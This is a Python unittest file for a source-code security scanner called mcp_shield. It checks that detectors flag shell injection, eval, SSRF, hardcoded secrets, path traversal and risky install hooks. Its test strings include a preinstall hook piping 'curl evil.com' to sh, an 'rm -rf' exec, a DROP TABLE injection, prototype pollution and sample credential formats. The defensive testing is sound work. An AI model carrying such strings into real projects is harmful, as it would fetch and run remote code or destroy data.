"""Tests for code (source) detectors — shell, eval, ssrf, secrets, path_traversal, permissions."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from mcp_shield.core.models import Severity, Surface
from mcp_shield.core.registry import create_default_registry


class _BaseCodeTest(unittest.TestCase):
    def setUp(self):
        reg = create_default_registry()
        self.det = {d.name: d for d in reg.source_detectors}


# ── ShellInjection ───────────────────────────────────────────────
class TestShellInjection(_BaseCodeTest):
    def test_shell_true_critical(self):
        code = "import subprocess\nsubprocess.run(cmd, shell=True)\n"
        f = self.det["shell_injection"].scan_file("t.py", code)
        self.assertTrue(any(x.severity == Severity.CRITICAL for x in f))

    def test_os_system(self):
        code = "import os\nos.system(user_input)\n"
        f = self.det["shell_injection"].scan_file("t.py", code)
        self.assertTrue(any("shell_injection" in x.rule_id for x in f))

    def test_child_process_exec_js(self):
        # Detector matches child_process.exec( pattern specifically
        code = "const child_process = require('child_process');\nchild_process.exec(cmd);\n"
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_force_push_detected(self):
        code = "git.updateReference({sha, force: true});\n"
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "force_push" for x in f))

    def test_shell_false_no_finding(self):
        code = "import subprocess\nsubprocess.run(['ls', '-la'], shell=False)\n"
        f = self.det["shell_injection"].scan_file("t.py", code)
        shell_findings = [x for x in f if x.rule_id == "shell_injection"]
        self.assertEqual(len(shell_findings), 0)


# ── EvalExec ─────────────────────────────────────────────────────
class TestEvalExec(_BaseCodeTest):
    def test_eval_with_input(self):
        code = "x = input()\neval(x)\n"
        f = self.det["eval_exec"].scan_file("t.py", code)
        self.assertTrue(any("eval_exec" in x.rule_id for x in f))

    def test_exec_static(self):
        code = 'exec("print(42)")\n'
        f = self.det["eval_exec"].scan_file("t.py", code)
        self.assertTrue(len(f) > 0)

    def test_new_function_js(self):
        code = "const fn = new Function(userCode);\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_clean_code_no_eval(self):
        code = "def add(a, b):\n    return a + b\n"
        f = self.det["eval_exec"].scan_file("t.py", code)
        self.assertEqual(len(f), 0)


# ── SSRF ─────────────────────────────────────────────────────────
class TestSsrf(_BaseCodeTest):
    def test_dynamic_url_env(self):
        code = "fetch(process.env.TARGET_URL)\n"
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_requests_get_fstring(self):
        # SSRF detector requires dynamic URL indicator (f-string, env, etc.)
        code = 'import requests\nrequests.get(f"http://{host}/api")\n'
        f = self.det["ssrf"].scan_file("t.py", code)
        self.assertTrue(len(f) > 0)

    def test_exfiltration_api_crux(self):
        # Regex matches "CrUX" or "crux" substring, not "chromeuxreport"
        code = 'const url = "https://api.crux.run/v1/records";\n'
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "exfiltration_api" for x in f))

    def test_exfiltration_api_sentry(self):
        code = 'fetch("https://ingest.sentry.io/api/123/envelope");\n'
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "exfiltration_api" for x in f))

    def test_hardcoded_safe_url_no_ssrf(self):
        code = 'requests.get("https://api.github.com/repos")\n'
        f = self.det["ssrf"].scan_file("t.py", code)
        ssrf = [x for x in f if x.rule_id == "ssrf_dynamic_url"]
        self.assertEqual(len(ssrf), 0)


# ── Secrets ──────────────────────────────────────────────────────
class TestSecrets(_BaseCodeTest):
    def test_hardcoded_password(self):
        code = 'password = "super_secret_123"\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "secrets_hardcoded" for x in f))

    def test_placeholder_ignored(self):
        code = 'api_key = "YOUR_API_KEY_HERE"\n'
        f = self.det["secrets"].scan_file("t.py", code)
        secret = [x for x in f if x.rule_id == "secrets_hardcoded"]
        self.assertEqual(len(secret), 0)

    def test_tls_disabled_python(self):
        code = "requests.get(url, verify=False)\n"
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "tls_disabled" for x in f))

    def test_tls_disabled_js(self):
        code = "rejectUnauthorized: false\n"
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "tls_disabled" for x in f))

    def test_sql_multistatement(self):
        code = 'query("ROLLBACK; DROP TABLE users")\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "sql_multistatement" for x in f))

    def test_credential_in_connection_string(self):
        code = '"postgresql://user:p4ssw0rd@host:5432/db"\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(
            any(x.rule_id in ("credential_in_args", "secrets_hardcoded") for x in f)
        )

    def test_token_detected(self):
        # Detector matches known var names like "token", "secret", "api_key"
        code = 'token = "ghp_abc123def456ghi789jkl012mno345pqr678"\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "secrets_hardcoded" for x in f))

    def test_env_reference_no_secret(self):
        code = 'password = os.environ["DB_PASSWORD"]\n'
        f = self.det["secrets"].scan_file("t.py", code)
        secret = [x for x in f if x.rule_id == "secrets_hardcoded"]
        self.assertEqual(len(secret), 0)


# ── PathTraversal ────────────────────────────────────────────────
class TestPathTraversal(_BaseCodeTest):
    def test_open_user_input(self):
        code = "path = input()\nf = open(path)\n"
        f = self.det["path_traversal"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "path_traversal" for x in f))

    def test_readfile_js(self):
        code = "const data = fs.readFileSync(req.params.file);\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_safe_hardcoded_path(self):
        code = 'f = open("/etc/hostname")\ndata = f.read()\n'
        f = self.det["path_traversal"].scan_file("t.py", code)
        traversal = [x for x in f if x.rule_id == "path_traversal"]
        self.assertEqual(len(traversal), 0)


# ── Permissions ──────────────────────────────────────────────────
class TestPermissions(_BaseCodeTest):
    def test_postinstall_script(self):
        code = '{"scripts": {"postinstall": "node setup.js"}}\n'
        f = self.det["permissions"].scan_file("package.json", code)
        self.assertTrue(any(x.rule_id == "postinstall_script" for x in f))

    def test_preinstall_script(self):
        code = '{"scripts": {"preinstall": "curl evil.com | sh"}}\n'
        f = self.det["permissions"].scan_file("package.json", code)
        self.assertTrue(any(x.rule_id == "postinstall_script" for x in f))

    def test_obfuscated_code_hex(self):
        code = r"var _0xab12 = _0xcd34[0x1]; var _0xef56 = _0xab12[0x2];" + "\n" * 3
        f = self.det["permissions"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "obfuscated_code" for x in f))

    def test_telemetry_detected(self):
        code = 'analytics.track("event", data);\n'
        f = self.det["permissions"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "telemetry_phonehome" for x in f))

    def test_clean_package_json(self):
        code = '{"name": "my-lib", "version": "1.0.0", "scripts": {"test": "jest"}}\n'
        f = self.det["permissions"].scan_file("package.json", code)
        install_hooks = [x for x in f if x.rule_id == "postinstall_script"]
        self.assertEqual(len(install_hooks), 0)


# ── ShellInjection JS/TS Extended ────────────────────────────────
# NOTE: Test strings below are DETECTION TARGETS for the security scanner,
# NOT actual command execution. They test that the scanner catches patterns.
class TestShellInjectionJSExtended(_BaseCodeTest):

    def test_spawn_detected(self):
        code = 'const cp = require("child_process");\nchild_process.spawn("ls");\n'
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(any("spawn" in x.title.lower() for x in f))

    def test_exec_file_detected(self):
        code = 'child_process.execFile("/bin/sh", ["-c", cmd]);\n'
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_fork_detected(self):
        code = 'child_process.fork("worker.js");\n'
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_spawn_sync_detected(self):
        code = 'child_process.spawnSync("git", ["push"]);\n'
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_destructured_exec_with_import(self):
        # Tests destructured import detection (exec from child_process)
        code = (
            'const { exec: runCmd } = require("child_process");\n'
            "exec(`rm -rf ${path}`);\n"
        )
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_destructured_spawn_esm(self):
        # Tests ES module import + spawn detection
        code = (
            'import { spawn } from "child_process";\n' 'spawn("node", ["server.js"]);\n'
        )
        f = self.det["shell_injection"].scan_file("t.ts", code)
        self.assertTrue(len(f) > 0)

    def test_deno_command(self):
        code = 'const proc = new Deno.Command("ls", {args: ["-la"]});\n'
        f = self.det["shell_injection"].scan_file("t.ts", code)
        self.assertTrue(any("deno" in x.title.lower() for x in f))

    def test_deno_run(self):
        code = 'Deno.run({cmd: ["echo", userInput]});\n'
        f = self.det["shell_injection"].scan_file("t.ts", code)
        self.assertTrue(len(f) > 0)

    def test_bun_spawn(self):
        code = 'Bun.spawn(["ls", "-la"]);\n'
        f = self.det["shell_injection"].scan_file("t.ts", code)
        self.assertTrue(any("bun" in x.title.lower() for x in f))

    def test_bun_spawn_sync(self):
        code = 'Bun.spawnSync(["git", "status"]);\n'
        f = self.det["shell_injection"].scan_file("t.ts", code)
        self.assertTrue(len(f) > 0)

    def test_exec_file_sync_detected(self):
        code = 'child_process.execFileSync("node", [script]);\n'
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_node_prefix_import(self):
        # Tests node: protocol import
        code = 'import { spawn } from "node:child_process";\n' 'spawn("ls", ["-la"]);\n'
        f = self.det["shell_injection"].scan_file("t.mjs", code)
        self.assertTrue(len(f) > 0)

    def test_comment_skipped(self):
        code = '// child_process.spawn("not real code");\n'
        f = self.det["shell_injection"].scan_file("t.js", code)
        shell = [x for x in f if x.rule_id in ("shell_injection", "shell_hardcoded")]
        self.assertEqual(len(shell), 0)

    def test_dynamic_spawn_high_severity(self):
        code = "child_process.spawn(`${cmd}`, args);\n"
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(any(x.severity.value in ("high", "critical") for x in f))


# ── EvalExec JS/TS Extended ─────────────────────────────────────
# NOTE: Test strings are scanner detection targets, not actual code.
class TestEvalExecJSExtended(_BaseCodeTest):

    def test_indirect_eval_comma(self):
        code = '(0, eval)("alert(1)");\n'
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("indirect" in x.title.lower() for x in f))

    def test_indirect_eval_globalthis(self):
        code = "globalThis.eval(code);\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("indirect" in x.title.lower() for x in f))

    def test_indirect_eval_window(self):
        code = "window.eval(payload);\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_function_without_new(self):
        code = 'const fn = Function("return this")();\n'
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("function" in x.title.lower() for x in f))

    def test_constructor_escape(self):
        code = '[].constructor.constructor("return this")();\n'
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("constructor" in x.title.lower() for x in f))

    def test_dynamic_import_variable(self):
        code = "const mod = await import(userInput);\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("import" in x.title.lower() for x in f))

    def test_dynamic_import_static_no_flag(self):
        code = 'const fs = await import("fs");\n'
        f = self.det["eval_exec"].scan_file("t.js", code)
        dynamic_imports = [
            x for x in f if "dynamic" in x.title.lower() and "import" in x.title.lower()
        ]
        self.assertEqual(len(dynamic_imports), 0)

    def test_vm_run_in_new_context(self):
        code = 'vm.runInNewContext("process.exit()", sandbox);\n'
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("vm" in x.title.lower() for x in f))

    def test_vm_compile_function(self):
        code = "vm.compileFunction(code, [], {});\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("vm" in x.title.lower() for x in f))

    def test_vm_script_run(self):
        code = "script.runInNewContext(sandbox);\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("vm" in x.title.lower() for x in f))

    def test_wasm_dynamic(self):
        code = "WebAssembly.instantiate(await fetch(url + wasmPath));\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("webassembly" in x.title.lower() for x in f))

    def test_wasm_static_no_finding(self):
        code = "WebAssembly.instantiate(wasmBytes);\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        wasm_findings = [x for x in f if "webassembly" in x.title.lower()]
        self.assertEqual(len(wasm_findings), 0)

    def test_set_timeout_string(self):
        code = 'setTimeout("alert(1)", 1000);\n'
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(any("settimeout" in x.title.lower() for x in f))

    def test_regex_exec_no_false_positive(self):
        code = "const match = /pattern/.exec(text);\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        eval_findings = [x for x in f if "eval()" in x.title.lower()]
        self.assertEqual(len(eval_findings), 0)


# ── SSRF JS/TS Extended ─────────────────────────────────────────
class TestSsrfJSExtended(_BaseCodeTest):

    def test_net_connect_dynamic(self):
        code = "net.connect({host: process.env.TARGET, port: 80});\n"
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_dns_resolve_dynamic(self):
        code = "dns.resolve(process.env.HOSTNAME, callback);\n"
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_websocket_dynamic(self):
        code = "const ws = new WebSocket(`ws://${host}/socket`);\n"
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_deno_fetch_env(self):
        code = "const resp = await Deno.fetch(Deno.env.get('API_URL'));\n"
        f = self.det["ssrf"].scan_file("t.ts", code)
        self.assertTrue(len(f) > 0)

    def test_bun_fetch_dynamic(self):
        code = "const resp = Bun.fetch(`${baseUrl}/api`);\n"
        f = self.det["ssrf"].scan_file("t.ts", code)
        self.assertTrue(len(f) > 0)

    def test_tls_connect_dynamic(self):
        code = "tls.connect({host: config.host, port: 443});\n"
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_dgram_dynamic(self):
        code = "const sock = dgram.createSocket(`udp${version}`);\n"
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_static_fetch_no_ssrf(self):
        code = 'fetch("https://api.github.com/repos");\n'
        f = self.det["ssrf"].scan_file("t.js", code)
        ssrf = [x for x in f if x.rule_id.startswith("ssrf")]
        self.assertEqual(len(ssrf), 0)


# ── Secrets Extended ─────────────────────────────────────────────
class TestSecretsExtended(_BaseCodeTest):

    def test_stripe_live_key(self):
        code = 'const key = "sk_live_abc123def456ghi789jkl";\n'
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any("stripe" in x.title.lower() for x in f))

    def test_stripe_test_key_detected(self):
        # Use realistic non-placeholder value (no "test"/"example" substring)
        code = 'const key = "sk_live_a1B2c3D4e5F6g7H8i9J0";\n'
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any("stripe" in x.title.lower() for x in f))

    def test_slack_token(self):
        code = 'const token = "xoxb-123456789012-abcdefghij";\n'
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any("slack" in x.title.lower() for x in f))

    def test_openai_key(self):
        code = 'const key = "sk-abcdefghijklmnopqrstuv";\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any("openai" in x.title.lower() for x in f))

    def test_sendgrid_key(self):
        code = 'apiKey = "SG.a1B2c3D4e5F6g7H8i9J0k1.a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8s9T0u1V";\n'
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any("sendgrid" in x.title.lower() for x in f))

    def test_npm_token(self):
        code = 'const token = "npm_abcdefghijklmnopqrstuvwxyz0123456789";\n'
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any("npm" in x.title.lower() for x in f))

    def test_gitlab_token(self):
        code = 'token = "glpat-abcdefghijklmnopqrstu";\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any("gitlab" in x.title.lower() for x in f))

    def test_shopify_token(self):
        code = 'const token = "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";\n'
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any("shopify" in x.title.lower() for x in f))

    def test_telegram_bot_token(self):
        # Token format: 8-10 digits : 35 alphanumeric/dash/underscore chars
        code = 'const token = "123456789:ABCDefgh_IJKLmnop-QRSTuvwx12345ABCD";\n'
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any("telegram" in x.title.lower() for x in f))

    def test_mailgun_key(self):
        code = 'key = "key-abcdef0123456789abcdef0123456789";\n'
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any("mailgun" in x.title.lower() for x in f))

    def test_pypi_token(self):
        code = 'token = "pypi-abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnop";\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any("pypi" in x.title.lower() for x in f))

    def test_aws_key_still_works(self):
        # Use realistic AWS key (no "EXAMPLE" which triggers placeholder filter)
        code = 'key = "AKIAI44QH8DHBK3R7VNK";\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any("aws" in x.title.lower() for x in f))


# ── PathTraversal JS/TS Extended ─────────────────────────────────
class TestPathTraversalJSExtended(_BaseCodeTest):

    def test_fs_open_user_input(self):
        code = "fs.open(req.params.file, 'r', callback);\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_fs_stat_user_input(self):
        code = "fs.statSync(req.query.path);\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_fs_symlink_user_input(self):
        code = "fs.symlink(req.body.target, req.body.link, callback);\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_fs_rename_user_input(self):
        code = "fs.renameSync(req.params.oldPath, req.params.newPath);\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_fs_copyfile_user_input(self):
        code = "fs.copyFileSync(req.body.src, req.body.dest);\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_fs_promises_open(self):
        code = "await fs.promises.open(req.params.file, 'r');\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_res_sendfile_user_input(self):
        code = "res.sendFile(req.params.filename);\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_deno_readfile_user_input(self):
        code = "await Deno.readFile(ctx.params.path);\n"
        f = self.det["path_traversal"].scan_file("t.ts", code)
        self.assertTrue(len(f) > 0)

    def test_deno_open_user_input(self):
        code = "await Deno.open(req.params.file);\n"
        f = self.det["path_traversal"].scan_file("t.ts", code)
        self.assertTrue(len(f) > 0)

    def test_bun_file_user_input(self):
        code = "const f = Bun.file(req.params.path);\n"
        f = self.det["path_traversal"].scan_file("t.ts", code)
        self.assertTrue(len(f) > 0)

    def test_safe_hardcoded_fs_no_finding(self):
        code = 'fs.readFileSync("/etc/hostname");\n'
        f = self.det["path_traversal"].scan_file("t.js", code)
        traversal = [x for x in f if x.rule_id == "path_traversal"]
        self.assertEqual(len(traversal), 0)


# ── Permissions JS/TS Extended ───────────────────────────────────
class TestPermissionsJSExtended(_BaseCodeTest):

    def test_bracket_require_global(self):
        code = 'const r = global["require"]("child_process");\n'
        f = self.det["permissions"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "obfuscated_code" for x in f))

    def test_process_main_module(self):
        code = 'process["mainModule"].require("fs");\n'
        f = self.det["permissions"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "obfuscated_code" for x in f))

    def test_hex_escaped_bracket(self):
        code = r'const m = obj["\x72equire"]("fs");' + "\n"
        f = self.det["permissions"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "obfuscated_code" for x in f))

    def test_proto_pollution(self):
        code = "obj.__proto__.isAdmin = true;\n"
        f = self.det["permissions"].scan_file("t.js", code)
        self.assertTrue(
            any("prototype" in x.title.lower() or "proto" in x.title.lower() for x in f)
        )

    def test_excessive_perms_deno(self):
        code = (
            'await Deno.readFile("data.txt");\n'
            'await Deno.fetch("https://evil.com");\n'
            'Deno.run({cmd: ["ls"]});\n'
        )
        f = self.det["permissions"].scan_file("t.ts", code)
        excessive = [x for x in f if x.rule_id == "excessive_permissions"]
        self.assertTrue(len(excessive) > 0)

    def test_excessive_perms_bun(self):
        code = (
            'const f = Bun.file("data.txt");\n'
            'const r = Bun.fetch("https://api.com");\n'
            'Bun.spawn(["ls"]);\n'
        )
        f = self.det["permissions"].scan_file("t.ts", code)
        excessive = [x for x in f if x.rule_id == "excessive_permissions"]
        self.assertTrue(len(excessive) > 0)

    def test_worker_threads_as_process(self):
        code = (
            'const { Worker } = require("worker_threads");\n'
            'new Worker("./evil.js");\n'
            'fetch("https://api.com/data");\n'
            'fs.readFileSync("data.txt");\n'
        )
        f = self.det["permissions"].scan_file("t.js", code)
        excessive = [x for x in f if x.rule_id == "excessive_permissions"]
        self.assertTrue(len(excessive) > 0)

    def test_clean_code_no_obfuscation(self):
        code = "const x = 1 + 2;\nconsole.log(x);\n"
        f = self.det["permissions"].scan_file("t.js", code)
        obfuscation = [x for x in f if x.rule_id == "obfuscated_code"]
        self.assertEqual(len(obfuscation), 0)


if __name__ == "__main__":
    unittest.main()
